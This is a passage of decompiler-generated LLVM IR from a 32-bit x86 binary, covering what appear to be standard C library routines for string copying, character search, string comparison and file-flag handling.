  %v8_8050ecb = icmp sgt i32 %v3_8050ec6, %v4_8050ec6
  br i1 %v8_8050ecb, label %dec_label_pc_8050ed1, label %dec_label_pc_8050ecd

dec_label_pc_8050ecd:                             ; preds = %dec_label_pc_8050ecb
  %v1_8050ecd = inttoptr i32 %v0_8050ec6 to i32*
  %v2_8050ecd = load i32, i32* %v1_8050ecd, align 4
  %v3_8050ecd = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8050ecd, %v3_8050ecd
  br i1 %tmp14, label %dec_label_pc_8050ed1, label %dec_label_pc_8050ed3

dec_label_pc_8050ed1:                             ; preds = %dec_label_pc_8050ecd, %dec_label_pc_8050ecb
  %v0_8050ed1 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050ed1 = sub i32 0, %v0_8050ed1
  store i32 %v1_8050ed1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050ed3

dec_label_pc_8050ed3:                             ; preds = %dec_label_pc_8050ecd, %dec_label_pc_8050e8e, %dec_label_pc_8050ed1
  %v0_8050ed3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050ed3 = icmp slt i32 %v0_8050ed3, 0
  %v1_8050ed5 = icmp eq i1 %v2_8050ed3, false
  br i1 %v1_8050ed5, label %dec_label_pc_8050ee7, label %dec_label_pc_8050ed7

dec_label_pc_8050ed7:                             ; preds = %dec_label_pc_8050ed3
  %v1_8050ed7 = call i32 @function_804b4bc(i32 %v2_8050eb0)
  %v1_8050edc = inttoptr i32 %v1_8050ed7 to i32*
  store i32 75, i32* %v1_8050edc, align 4
  %v0_8050eea.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050ee7

dec_label_pc_8050ee4:                             ; preds = %dec_label_pc_8050e73, %dec_label_pc_8050e6e
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050ee7

dec_label_pc_8050ee7:                             ; preds = %dec_label_pc_8050ed3, %dec_label_pc_8050ed7, %dec_label_pc_8050ee4
  %v0_8050eea = phi i32 [ %v0_8050ed3, %dec_label_pc_8050ed3 ], [ %v0_8050eea.pre, %dec_label_pc_8050ed7 ], [ -1, %dec_label_pc_8050ee4 ]
  ret i32 %v0_8050eea

; uselistorder directives
  uselistorder i32 %v4_8050ec6, { 1, 0 }
  uselistorder i32 %v3_8050ec6, { 1, 0 }
  uselistorder i32 %v1_8050e66, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8050e5f, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8050e58, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ee7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ed3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e8e, { 4, 0, 1, 2, 3 }
}

define i32 @function_8050ef0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050ef0:
  %edx.global-to-local = alloca i32, align 4
  %v0_8050ef0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050ef8 = add i32 %arg1, 8
  %v2_8050ef8 = inttoptr i32 %v1_8050ef8 to i32*
  %v3_8050ef8 = load i32, i32* %v2_8050ef8, align 4
  store i32 %v3_8050ef8, i32* %edx.global-to-local, align 4
  %v1_8050efb = add i32 %arg1, 12
  %v2_8050efb = inttoptr i32 %v1_8050efb to i32*
  %v3_8050efb = load i32, i32* %v2_8050efb, align 4
  %v2_8050efe = sub i32 %v3_8050efb, %v3_8050ef8
  %v3_8050f03 = inttoptr i32 %arg1 to i16*
  %v4_8050f03 = call i32 @function_8050e04(i16* %v3_8050f03, i32 %v3_8050ef8, i32 %v2_8050efe)
  %v0_8050f08 = load i32, i32* @ebx, align 4
  %v1_8050f08 = add i32 %v0_8050f08, 8
  %v2_8050f08 = inttoptr i32 %v1_8050f08 to i32*
  %v3_8050f08 = load i32, i32* %v2_8050f08, align 4
  store i32 %v3_8050f08, i32* %edx.global-to-local, align 4
  %v2_8050f0b = add i32 %v0_8050f08, 16
  %v3_8050f0b = inttoptr i32 %v2_8050f0b to i32*
  store i32 %v3_8050f08, i32* %v3_8050f0b, align 4
  %v0_8050f0e = load i32, i32* %edx.global-to-local, align 4
  %v2_8050f0e = add i32 %v0_8050f0e, %v4_8050f03
  store i32 %v2_8050f0e, i32* %edx.global-to-local, align 4
  %v1_8050f10 = load i32, i32* @ebx, align 4
  %v2_8050f10 = add i32 %v1_8050f10, 20
  %v3_8050f10 = inttoptr i32 %v2_8050f10 to i32*
  store i32 %v2_8050f0e, i32* %v3_8050f10, align 4
  store i32 %v0_8050ef0, i32* @ebx, align 4
  ret i32 %v4_8050f03

; uselistorder directives
  uselistorder i32 %v4_8050f03, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_8050f18(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050f18:
  %v0_8050f18 = load i32, i32* @ebx, align 4
  %v4_8050f1c = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050f1c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8050f24 = bitcast i16* %arg1 to i32*
  %v2_8050f24 = load i32, i32* %v1_8050f24, align 4
  %v1_8050f26 = urem i32 %v2_8050f24, 65536
  %v2_8050f29 = and i32 %v1_8050f26, %arg2
  %v3_8050f29 = icmp eq i32 %v2_8050f29, 0
  %v1_8050f2b = icmp eq i1 %v3_8050f29, false
  br i1 %v1_8050f2b, label %dec_label_pc_8050f3a, label %dec_label_pc_8050f2d

dec_label_pc_8050f2d:                             ; preds = %dec_label_pc_8050f18
  %v1_8050f2d = and i32 %v2_8050f24, 2176
  %v2_8050f2d = icmp eq i32 %v1_8050f2d, 0
  %v1_8050f33 = icmp eq i1 %v2_8050f2d, false
  br i1 %v1_8050f33, label %dec_label_pc_8050f41, label %dec_label_pc_8050f35

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050f2d
  %v2_8050f35 = or i32 %v2_8050f24, %arg2
  %v1_8050f37 = trunc i32 %v2_8050f35 to i16
  store i16 %v1_8050f37, i16* %arg1, align 2
  %v0_8050f3a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050f3a

dec_label_pc_8050f3a:                             ; preds = %dec_label_pc_8050f18, %dec_label_pc_8050f35
  %v0_8050f5c = phi i32 [ %v4_8050f1c, %dec_label_pc_8050f18 ], [ %v0_8050f3a.pre, %dec_label_pc_8050f35 ]
  %v1_8050f3a = inttoptr i32 %v0_8050f5c to i16*
  %v2_8050f3a = load i16, i16* %v1_8050f3a, align 2
  %v2_8050f3d = and i16 %v2_8050f3a, 16
  %v3_8050f3d = icmp eq i16 %v2_8050f3d, 0
  br i1 %v3_8050f3d, label %dec_label_pc_8050f55, label %dec_label_pc_8050f41

dec_label_pc_8050f41:                             ; preds = %dec_label_pc_8050f3a, %dec_label_pc_8050f2d
  %v1_8050f41 = call i32 @function_804b4bc(i32 %v0_8050f18)
  %v1_8050f46 = inttoptr i32 %v1_8050f41 to i32*
  store i32 9, i32* %v1_8050f46, align 4
  br label %dec_label_pc_8050f4c

dec_label_pc_8050f4c:                             ; preds = %dec_label_pc_8050f59, %dec_label_pc_8050f41
  %v0_8050f4c = load i32, i32* @ebx, align 4
  %v1_8050f4c = inttoptr i32 %v0_8050f4c to i16*
  %v2_8050f4c = load i16, i16* %v1_8050f4c, align 2
  %v3_8050f4c = or i16 %v2_8050f4c, 8
  store i16 %v3_8050f4c, i16* %v1_8050f4c, align 2
  br label %dec_label_pc_8050f79

dec_label_pc_8050f55:                             ; preds = %dec_label_pc_8050f3a
  %v2_8050f55 = and i16 %v2_8050f3a, 64
  %v3_8050f55 = icmp eq i16 %v2_8050f55, 0
  br i1 %v3_8050f55, label %dec_label_pc_8050f73, label %dec_label_pc_8050f59

dec_label_pc_8050f59:                             ; preds = %dec_label_pc_8050f55
  %v2_8050f5d = call i32 @function_804bcc0(i32 %v0_8050f5c)
  %v1_8050f65 = icmp eq i32 %v2_8050f5d, 0
  %v1_8050f67 = icmp eq i1 %v1_8050f65, false
  br i1 %v1_8050f67, label %dec_label_pc_8050f4c, label %dec_label_pc_8050f69

dec_label_pc_8050f69:                             ; preds = %dec_label_pc_8050f59
  %v0_8050f69 = load i32, i32* @ebx, align 4
  %v1_8050f69 = inttoptr i32 %v0_8050f69 to i16*
  %v2_8050f69 = load i16, i16* %v1_8050f69, align 2
  %v3_8050f69 = and i16 %v2_8050f69, -65
  store i16 %v3_8050f69, i16* %v1_8050f69, align 2
  %v0_8050f6d = load i32, i32* @ebx, align 4
  %v1_8050f6d = add i32 %v0_8050f6d, 8
  %v2_8050f6d = inttoptr i32 %v1_8050f6d to i32*
  %v3_8050f6d = load i32, i32* %v2_8050f6d, align 4
  %v2_8050f70 = add i32 %v0_8050f6d, 28
  %v3_8050f70 = inttoptr i32 %v2_8050f70 to i32*
  store i32 %v3_8050f6d, i32* %v3_8050f70, align 4
  %v0_8050f73.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050f73

dec_label_pc_8050f73:                             ; preds = %dec_label_pc_8050f55, %dec_label_pc_8050f69
  %v9_8050f73 = phi i32 [ %v0_8050f5c, %dec_label_pc_8050f55 ], [ %v0_8050f73.pre, %dec_label_pc_8050f69 ]
  %v1_8050f73 = inttoptr i32 %v9_8050f73 to i16*
  %v2_8050f73 = load i16, i16* %v1_8050f73, align 2
  %v3_8050f73 = or i16 %v2_8050f73, 1
  store i16 %v3_8050f73, i16* %v1_8050f73, align 2
  br label %dec_label_pc_8050f79

dec_label_pc_8050f79:                             ; preds = %dec_label_pc_8050f4c, %dec_label_pc_8050f73
  %storemerge = phi i32 [ 0, %dec_label_pc_8050f73 ], [ -1, %dec_label_pc_8050f4c ]
  store i32 %v0_8050f18, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8050f24, { 1, 2, 0 }
  uselistorder i32 %v0_8050f18, { 1, 0 }
  uselistorder i16 1, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804bcc0, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16 8, { 2, 3, 0, 4, 6, 1, 5 }
  uselistorder i16 0, { 0, 6, 1, 7, 4, 5, 8, 9, 10, 2, 3 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050f79, { 1, 0 }
  uselistorder label %dec_label_pc_8050f73, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3a, { 1, 0 }
}

define i32 @function_8050f80(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050f80:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8050f8c = add i32 %tmp5, 4
  %v2_8050f8c = inttoptr i32 %v1_8050f8c to i32*
  %v3_8050f8c = load i32, i32* %v2_8050f8c, align 4
  %v2_8050f8f = load i32, i32* %arg2, align 4
  %v1_8050f95 = add i32 %arg1, 4
  %v2_8050f95 = inttoptr i32 %v1_8050f95 to i32*
  %v3_8050f95 = load i32, i32* %v2_8050f95, align 4
  %v4_8050f98 = call i32 @function_8051b9c(i32 %v3_8050f95, i32 %v2_8050f8f, i32 %v3_8050f8c, i32 %arg3)
  %v0_8050fa2 = load i32, i32* @edx, align 4
  %v2_8050fa2 = icmp slt i32 %v0_8050fa2, 0
  br i1 %v2_8050fa2, label %dec_label_pc_8050fad, label %dec_label_pc_8050fa6

dec_label_pc_8050fa6:                             ; preds = %dec_label_pc_8050f80
  %v1_8050fa6 = load i32, i32* @ebx, align 4
  %v2_8050fa6 = inttoptr i32 %v1_8050fa6 to i32*
  store i32 %v4_8050f98, i32* %v2_8050fa6, align 4
  %v0_8050fa8 = load i32, i32* @edx, align 4
  %v1_8050fa8 = load i32, i32* @ebx, align 4
  %v2_8050fa8 = add i32 %v1_8050fa8, 4
  %v3_8050fa8 = inttoptr i32 %v2_8050fa8 to i32*
  store i32 %v0_8050fa8, i32* %v3_8050fa8, align 4
  br label %dec_label_pc_8050fad

dec_label_pc_8050fad:                             ; preds = %dec_label_pc_8050f80, %dec_label_pc_8050fa6
  %v0_8050fad = phi i32 [ %v4_8050f98, %dec_label_pc_8050f80 ], [ 0, %dec_label_pc_8050fa6 ]
  ret i32 %v0_8050fad

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8050fad, { 1, 0 }
}

define i32 @function_8050fb4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050fb4:
  %v4_8050fb6 = ptrtoint i8* %arg1 to i32
  %v4_8050fbe.pre = load i32, i32* @eax, align 4
  %v8_8050fbe.pre = load i1, i1* @df, align 1
  %v9_8050fbe = select i1 %v8_8050fbe.pre, i32 -1, i32 1
  br label %dec_label_pc_8050fbe

dec_label_pc_8050fbe:                             ; preds = %dec_label_pc_8050fc2, %dec_label_pc_8050fb4
  %v20_8050fbf = phi i32 [ %v23_8050fbf, %dec_label_pc_8050fc2 ], [ %arg2, %dec_label_pc_8050fb4 ]
  %v4_8050fbe = phi i32 [ %v6_8050fbe, %dec_label_pc_8050fc2 ], [ %v4_8050fbe.pre, %dec_label_pc_8050fb4 ]
  %v7_8050fbe = phi i32 [ %v10_8050fbe, %dec_label_pc_8050fc2 ], [ %v4_8050fb6, %dec_label_pc_8050fb4 ]
  %v1_8050fbe = inttoptr i32 %v7_8050fbe to i8*
  %v2_8050fbe = load i8, i8* %v1_8050fbe, align 1
  %v3_8050fbf = inttoptr i32 %v20_8050fbf to i8*
  %v4_8050fbf = load i8, i8* %v3_8050fbf, align 1
  %v15_8050fbf = icmp eq i8 %v2_8050fbe, %v4_8050fbf
  %v1_8050fc0 = icmp eq i1 %v15_8050fbf, false
  br i1 %v1_8050fc0, label %dec_label_pc_8050fca, label %dec_label_pc_8050fc2

dec_label_pc_8050fc2:                             ; preds = %dec_label_pc_8050fbe
  %v3_8050fbe = zext i8 %v2_8050fbe to i32
  %v5_8050fbe = and i32 %v4_8050fbe, -256
  %v6_8050fbe = or i32 %v3_8050fbe, %v5_8050fbe
  %v23_8050fbf = add i32 %v20_8050fbf, %v9_8050fbe
  %v10_8050fbe = add i32 %v7_8050fbe, %v9_8050fbe
  %v4_8050fc2 = icmp eq i8 %v2_8050fbe, 0
  %v1_8050fc4 = icmp eq i1 %v4_8050fc2, false
  br i1 %v1_8050fc4, label %dec_label_pc_8050fbe, label %dec_label_pc_8050fce

dec_label_pc_8050fca:                             ; preds = %dec_label_pc_8050fbe
  br label %dec_label_pc_8050fce

dec_label_pc_8050fce:                             ; preds = %dec_label_pc_8050fc2, %dec_label_pc_8050fca
  %storemerge = phi i32 [ 1, %dec_label_pc_8050fca ], [ 0, %dec_label_pc_8050fc2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8050fbe, { 1, 2, 0 }
  uselistorder i32 %v9_8050fbe, { 1, 0 }
  uselistorder label %dec_label_pc_8050fce, { 1, 0 }
}

define i32 @function_8050fd4() local_unnamed_addr {
dec_label_pc_8050fd4:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050fd5 = load i32, i32* @esi, align 4
  store i32 %v0_8050fd5, i32* %stack_var_-8, align 4
  %v4_8050fd6 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8050fd6, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8050fe3 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8050fe7 = call i32 @_strlen(i8* %v4_8050fe3)
  %v2_8050fe9 = add i32 %tmp, -1
  store i32 %v2_8050fe9, i32* %edi.global-to-local, align 4
  %v0_8050fea = load i32, i32* %edx.global-to-local, align 4
  %v8_8050fed10 = icmp eq i32 %v0_8050fea, 0
  store i32 %v0_8050fea, i32* %ecx.global-to-local, align 4
  br i1 %v8_8050fed10, label %dec_label_pc_8050ff8, label %dec_label_pc_8050ff0.lr.ph

dec_label_pc_8050ff0.lr.ph:                       ; preds = %dec_label_pc_8050fd4
  %v4_8050ff0.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8050ff0.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8050ff0

dec_label_pc_8050ff0:                             ; preds = %dec_label_pc_8050ff0.lr.ph, %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge
  %v8_8050ff0 = phi i1 [ %v8_8050ff0.pre, %dec_label_pc_8050ff0.lr.ph ], [ %v5_8050ff1, %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge ]
  %v4_8050ff0 = phi i32 [ %v4_8050ff0.pre, %dec_label_pc_8050ff0.lr.ph ], [ %v0_8050ff2, %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge ]
  %v2_8050ffa11 = phi i32 [ %v2_8050fe9, %dec_label_pc_8050ff0.lr.ph ], [ %v7_8050ff1, %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge ]
  %v0_8050ff0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050ff0 = inttoptr i32 %v0_8050ff0 to i8*
  %v2_8050ff0 = load i8, i8* %v1_8050ff0, align 1
  %v3_8050ff0 = zext i8 %v2_8050ff0 to i32
  %v5_8050ff0 = and i32 %v4_8050ff0, -256
  %v6_8050ff0 = or i32 %v5_8050ff0, %v3_8050ff0
  store i32 %v6_8050ff0, i32* %eax.global-to-local, align 4
  %v9_8050ff0 = select i1 %v8_8050ff0, i32 -1, i32 1
  %v10_8050ff0 = add i32 %v9_8050ff0, %v0_8050ff0
  store i32 %v10_8050ff0, i32* %esi.global-to-local, align 4
  %v3_8050ff1 = inttoptr i32 %v2_8050ffa11 to i8*
  store i8 %v2_8050ff0, i8* %v3_8050ff1, align 1
  %v4_8050ff1 = load i32, i32* %edi.global-to-local, align 4
  %v5_8050ff1 = load i1, i1* @df, align 1
  %v6_8050ff1 = select i1 %v5_8050ff1, i32 -1, i32 1
  %v7_8050ff1 = add i32 %v6_8050ff1, %v4_8050ff1
  store i32 %v7_8050ff1, i32* %edi.global-to-local, align 4
  %v0_8050ff2 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050ff2 = trunc i32 %v0_8050ff2 to i8
  %v4_8050ff2 = icmp eq i8 %v3_8050ff2, 0
  %v1_8050ff4 = icmp eq i1 %v4_8050ff2, false
  br i1 %v1_8050ff4, label %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge, label %dec_label_pc_8050ffb

dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge: ; preds = %dec_label_pc_8050ff0
  %v0_8050fed.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050fed = add i32 %v0_8050fed.pre, -1
  %v8_8050fed = icmp eq i32 %v1_8050fed, 0
  store i32 %v1_8050fed, i32* %ecx.global-to-local, align 4
  br i1 %v8_8050fed, label %dec_label_pc_8050ff8, label %dec_label_pc_8050ff0

dec_label_pc_8050ff8:                             ; preds = %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge, %dec_label_pc_8050fd4
  %v2_8050ffa.lcssa = phi i32 [ %v2_8050fe9, %dec_label_pc_8050fd4 ], [ %v7_8050ff1, %dec_label_pc_8050ff0.dec_label_pc_8050fed_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8050ffa = inttoptr i32 %v2_8050ffa.lcssa to i8*
  store i8 0, i8* %v3_8050ffa, align 1
  %v4_8050ffa = load i32, i32* %edi.global-to-local, align 4
  %v5_8050ffa = load i1, i1* @df, align 1
  %v6_8050ffa = select i1 %v5_8050ffa, i32 -1, i32 1
  %v7_8050ffa = add i32 %v6_8050ffa, %v4_8050ffa
  store i32 %v7_8050ffa, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050ffb

dec_label_pc_8050ffb:                             ; preds = %dec_label_pc_8050ff0, %dec_label_pc_8050ff8
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8050fff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050fff, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8050fed, { 1, 0 }
  uselistorder i32 %v0_8050ff2, { 1, 0 }
  uselistorder i32 %v7_8050ff1, { 0, 2, 1 }
  uselistorder i1 %v5_8050ff1, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8050ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8050ff0, { 1, 0 }
}

define i32 @function_8051004(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051004:
  %v0_8051005 = load i32, i32* @ebx, align 4
  %v4_8051006 = urem i32 %arg2, 256
  %v4_805100a = ptrtoint i8* %arg1 to i32
  %v2_80510153 = urem i32 %v4_805100a, 4
  %v3_80510154 = icmp eq i32 %v2_80510153, 0
  %v1_80510178 = icmp eq i1 %v3_80510154, false
  %v4_8051010 = trunc i32 %arg2 to i8
  br i1 %v1_80510178, label %dec_label_pc_8051010, label %dec_label_pc_8051019

dec_label_pc_8051010:                             ; preds = %dec_label_pc_8051004, %dec_label_pc_8051014
  %v0_8051014 = phi i32 [ %v1_8051014, %dec_label_pc_8051014 ], [ %v4_805100a, %dec_label_pc_8051004 ]
  %v1_8051010 = inttoptr i32 %v0_8051014 to i8*
  %v2_8051010 = load i8, i8* %v1_8051010, align 1
  %v15_8051010 = icmp eq i8 %v2_8051010, %v4_8051010
  br i1 %v15_8051010, label %dec_label_pc_8051064, label %dec_label_pc_8051014

dec_label_pc_8051014:                             ; preds = %dec_label_pc_8051010
  %v1_8051014 = add i32 %v0_8051014, 1
  %v2_8051015 = urem i32 %v1_8051014, 4
  %v3_8051015 = icmp eq i32 %v2_8051015, 0
  %v1_8051017 = icmp eq i1 %v3_8051015, false
  br i1 %v1_8051017, label %dec_label_pc_8051010, label %dec_label_pc_8051019

dec_label_pc_8051019:                             ; preds = %dec_label_pc_8051004, %dec_label_pc_8051014
  %v0_805101c = phi i32 [ %v1_8051014, %dec_label_pc_8051014 ], [ %v4_805100a, %dec_label_pc_8051004 ]
  %v2_8051020 = mul nuw nsw i32 %v4_8051006, 256
  %v2_8051023 = or i32 %v2_8051020, %v4_8051006
  %v2_8051027 = mul i32 %v2_8051023, 65536
  %v2_805102a = or i32 %v2_8051027, %v2_8051023
  br label %dec_label_pc_805102c

dec_label_pc_805102c:                             ; preds = %dec_label_pc_805105c, %dec_label_pc_805102c, %dec_label_pc_8051019
  %v0_8051030 = phi i32 [ %v0_805101c, %dec_label_pc_8051019 ], [ %v1_8051030, %dec_label_pc_805102c ], [ %v1_8051030, %dec_label_pc_805105c ]
  %v2_805102e = inttoptr i32 %v0_8051030 to i32*
  %v3_805102e = load i32, i32* %v2_805102e, align 4
  %v4_805102e = xor i32 %v3_805102e, %v2_805102a
  %v1_8051030 = add i32 %v0_8051030, 4
  %v1_8051033 = add i32 %v4_805102e, 2130640639
  %v1_8051039 = sub i32 -1, %v4_805102e
  %v2_805103b = xor i32 %v1_8051033, %v1_8051039
  %v1_805103d = and i32 %v2_805103b, -2130640640
  %v2_805103d = icmp eq i32 %v1_805103d, 0
  br i1 %v2_805103d, label %dec_label_pc_805102c, label %dec_label_pc_8051044

dec_label_pc_8051044:                             ; preds = %dec_label_pc_805102c
  %v2_8051047 = inttoptr i32 %v0_8051030 to i8*
  %v3_8051047 = load i8, i8* %v2_8051047, align 1
  %v16_8051047 = icmp eq i8 %v3_8051047, %v4_8051010
  br i1 %v16_8051047, label %dec_label_pc_8051064, label %dec_label_pc_805104c

dec_label_pc_805104c:                             ; preds = %dec_label_pc_8051044
  %v1_805104c = add i32 %v0_8051030, 1
  %v2_805104f = inttoptr i32 %v1_805104c to i8*
  %v3_805104f = load i8, i8* %v2_805104f, align 1
  %v16_805104f = icmp eq i8 %v3_805104f, %v4_8051010
  br i1 %v16_805104f, label %dec_label_pc_8051064, label %dec_label_pc_8051054

dec_label_pc_8051054:                             ; preds = %dec_label_pc_805104c
  %v1_8051054 = add i32 %v0_8051030, 2
  %v2_8051057 = inttoptr i32 %v1_8051054 to i8*
  %v3_8051057 = load i8, i8* %v2_8051057, align 1
  %v16_8051057 = icmp eq i8 %v3_8051057, %v4_8051010
  br i1 %v16_8051057, label %dec_label_pc_8051064, label %dec_label_pc_805105c

dec_label_pc_805105c:                             ; preds = %dec_label_pc_8051054
  %v1_805105c = add i32 %v0_8051030, 3
  %v2_805105f = inttoptr i32 %v1_805105c to i8*
  %v3_805105f = load i8, i8* %v2_805105f, align 1
  %v16_805105f = icmp eq i8 %v3_805105f, %v4_8051010
  %v1_8051062 = icmp eq i1 %v16_805105f, false
  br i1 %v1_8051062, label %dec_label_pc_805102c, label %dec_label_pc_8051064

dec_label_pc_8051064:                             ; preds = %dec_label_pc_8051010, %dec_label_pc_805105c, %dec_label_pc_8051054, %dec_label_pc_805104c, %dec_label_pc_8051044
  %v0_8051066 = phi i32 [ %v1_805105c, %dec_label_pc_805105c ], [ %v1_8051054, %dec_label_pc_8051054 ], [ %v1_805104c, %dec_label_pc_805104c ], [ %v0_8051030, %dec_label_pc_8051044 ], [ %v0_8051014, %dec_label_pc_8051010 ]
  store i32 %v0_8051005, i32* @ebx, align 4
  ret i32 %v0_8051066

; uselistorder directives
  uselistorder i32 %v1_8051030, { 1, 0 }
  uselistorder i32 %v2_8051023, { 1, 0 }
  uselistorder i32 %v1_8051014, { 1, 0, 2 }
  uselistorder i32 %v4_805100a, { 2, 1, 0 }
  uselistorder i32 %v4_8051006, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051064, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8051019, { 1, 0 }
  uselistorder label %dec_label_pc_8051010, { 1, 0 }
}

define i32 @function_8051068(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051068:
  %v2_805108a30 = load i8, i8* %arg1, align 1
  %v4_805108c34 = icmp eq i8 %v2_805108a30, 0
  br i1 %v4_805108c34, label %dec_label_pc_8051094, label %dec_label_pc_8051090.lr.ph

dec_label_pc_8051090.lr.ph:                       ; preds = %dec_label_pc_8051068
  %v3_805108a31 = zext i8 %v2_805108a30 to i32
  %v4_805108a.pre = load i32, i32* @eax, align 4
  %v5_805108a32 = and i32 %v4_805108a.pre, -256
  %v6_805108a33 = or i32 %v3_805108a31, %v5_805108a32
  %v4_8051071 = ptrtoint i8* %arg1 to i32
  %v1_805107c18 = inttoptr i32 %arg2 to i8*
  %v4_805107c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051090

dec_label_pc_8051077:                             ; preds = %dec_label_pc_8051090, %dec_label_pc_805107b
  %v6_805107c27 = phi i32 [ %v6_805107c, %dec_label_pc_805107b ], [ %v6_805107c22, %dec_label_pc_8051090 ]
  %v2_805107c26 = phi i8 [ %v2_805107c, %dec_label_pc_805107b ], [ %v2_805107c19, %dec_label_pc_8051090 ]
  %v0_805107b25 = phi i32 [ %v1_805107b, %dec_label_pc_805107b ], [ %arg2, %dec_label_pc_8051090 ]
  %v15_8051077 = icmp eq i8 %v2_805108a37, %v2_805107c26
  br i1 %v15_8051077, label %dec_label_pc_8051084, label %dec_label_pc_805107b

dec_label_pc_805107b:                             ; preds = %dec_label_pc_8051077
  %v1_805107b = add i32 %v0_805107b25, 1
  store i32 %v1_805107b, i32* @edx, align 4
  %v1_805107c = inttoptr i32 %v1_805107b to i8*
  %v2_805107c = load i8, i8* %v1_805107c, align 1
  %v3_805107c = zext i8 %v2_805107c to i32
  %v5_805107c = and i32 %v6_805107c27, -256
  %v6_805107c = or i32 %v3_805107c, %v5_805107c
  store i32 %v6_805107c, i32* @ecx, align 4
  %v4_805107e = icmp eq i8 %v2_805107c, 0
  %v1_8051080 = icmp eq i1 %v4_805107e, false
  br i1 %v1_8051080, label %dec_label_pc_8051077, label %dec_label_pc_8051094

dec_label_pc_8051084:                             ; preds = %dec_label_pc_8051077
  %v1_8051088 = add i32 %v0_805109435, 1
  %v1_8051089 = add i32 %v0_805108936, 1
  %v1_805108a = inttoptr i32 %v1_8051089 to i8*
  %v2_805108a = load i8, i8* %v1_805108a, align 1
  %v3_805108a = zext i8 %v2_805108a to i32
  %v5_805108a = and i32 %v6_805108a38, -256
  %v6_805108a = or i32 %v3_805108a, %v5_805108a
  %v4_805108c = icmp eq i8 %v2_805108a, 0
  br i1 %v4_805108c, label %dec_label_pc_8051094, label %dec_label_pc_8051090

dec_label_pc_8051090:                             ; preds = %dec_label_pc_8051090.lr.ph, %dec_label_pc_8051084
